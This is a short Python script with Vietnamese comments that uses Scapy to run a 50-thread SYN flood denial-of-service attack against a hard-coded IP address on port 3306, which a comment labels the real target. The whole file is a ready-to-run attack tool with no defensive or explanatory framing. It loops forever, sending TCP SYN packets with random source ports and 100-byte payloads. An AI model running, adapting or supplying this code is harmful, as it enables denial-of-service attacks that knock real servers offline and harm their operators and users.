from scapy.all import *
import threading
import time

# Cấu hình
target_ip = "160.191.54.55"  # IP mục tiêu thực tế
target_port = 3306
num_threads = 50  # Số luồng (điều chỉnh tùy máy)

# Hàm gửi gói SYN với IP nguồn thực tế
def syn_flood():
    while True:
        try:
            src_port = random.randint(1024, 65535)  # Chỉ tạo port ngẫu nhiên
            
            # Tạo gói tin (IP nguồn để trống để Scapy tự động điền IP hợp lệ)
            ip = IP(dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
            payload = Raw(b"X" * 100)  # Payload 100 byte để tối ưu
            pkt = ip / tcp / payload
            
            # Gửi gói tin
            send(pkt, verbose=False)
            
        except Exception as e:
            print(f"Error: {e}")
            break

# Khởi động các thread tấn công
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Giữ chương trình chạy
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopped by user")